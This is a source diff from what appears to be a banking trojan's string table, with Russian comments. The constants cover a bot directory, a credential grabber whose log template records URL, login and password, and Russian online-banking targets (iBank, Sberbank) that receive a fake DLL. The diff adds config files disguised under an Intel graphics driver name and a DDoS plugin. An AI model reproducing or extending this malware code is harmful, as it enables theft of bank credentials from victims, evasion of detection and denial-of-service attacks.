@@ -72,6 +72,9 @@ CSSTR EStrServiceName[] = "Windows NAT";
 CSSTR StrBotWorkPath[] = "WnsBMT"; // Рабочий каталог бота
 CSSTR StrGrabberPath[] = "gdata";  // Имя рабочей папки грабера
 
+CSSTR EStrConfigFileName[]   = "igfxtray.dat"; // Имя файла хранения конфига
+CSSTR EStrConfigHPFileName[] = "igfxtrayhp.dat"; // Имя файла хранения конфига повышенного приоритета
+
 
 // Имена служебный пайпов
 CSSTR EStrPipeLoader[] = "ldrspp"; // Имя служебного пайпа лоадера
@@ -135,8 +138,8 @@ CSSTR IFobsFlagCopy[] = "ifobscopy.txt";
 // Строки модуля BSS грабера
 #ifdef BSSH
 	CSSTR BSSLogTemplate[] = "Url: %s\r\n\r\n"
-							 "Login:    %s\r\n"
-							 "Password: %s\r\n\r\n"
+							 "Login:     %s\r\n"
+							 "Password:  %s\r\n\r\n"
 							 "UserAgent: %s\r\n";
 #endif
 
@@ -146,6 +149,15 @@ CSSTR IFobsFlagCopy[] = "ifobscopy.txt";
 	CSSTR EStrIBankRegistryPath[] = "SOFTWARE\\Classes\\Installer\\Products\\7B00DF09E169B5445AD2F176D624114\\";
 	CSSTR EStrSberRegistryKey[]   = "SBRF\\";
 	CSSTR EStrIBankFileName[]     = ".iBank2"; // Имя файли при обнаружении которого будет установлена Fake DLL
+#endif
+
+
+#ifdef ddosH
+	// Имя плагина DDOS
+	CSSTR EStrDDOSPlugin[] = "ddos.plug";
+
+	// Имя файла данных для команды DDOS
+	CSSTR EStrDDOSSignal[] = "ddos.sig";
 #endif
 
 
